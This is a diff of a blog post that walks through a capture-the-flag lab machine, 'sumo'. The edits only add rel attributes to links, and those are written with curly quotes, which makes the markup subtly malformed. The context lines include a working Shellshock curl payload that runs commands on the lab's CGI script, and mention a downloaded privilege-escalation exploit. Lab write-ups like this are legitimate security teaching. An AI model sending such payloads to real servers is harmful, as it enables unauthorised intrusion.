@@ -86,7 +86,7 @@ root@kali:~# nikto -h sumo.local
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">here.</a> I tested the vulnerability by running the <b>id</b> command.
+If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" rel=”nofollow”>here.</a> I tested the vulnerability by running the <b>id</b> command.
 ```r
 root@kali:~# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://sumo.local/cgi-bin/test/test.cgi  
 
@@ -120,7 +120,7 @@ uname -a
 Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Instead I used <a href="https://www.exploit-db.com/exploits/33589"> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and transferred it to the target machine in the tmp directory.
+Instead I used <a href="https://www.exploit-db.com/exploits/33589" rel=”nofollow”> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and transferred it to the target machine in the tmp directory.
 
 ```r
 www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
@@ -163,4 +163,4 @@ cat /root/root.txt
 ```
 <p align="justify"> That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future! If you have any queries, you can contact me <a href="/contact">here.</a> </p>
 
-NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/MarkusM">Markus Magnusson.</a>
+NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/MarkusM" rel=”nofollow”>Markus Magnusson.</a>
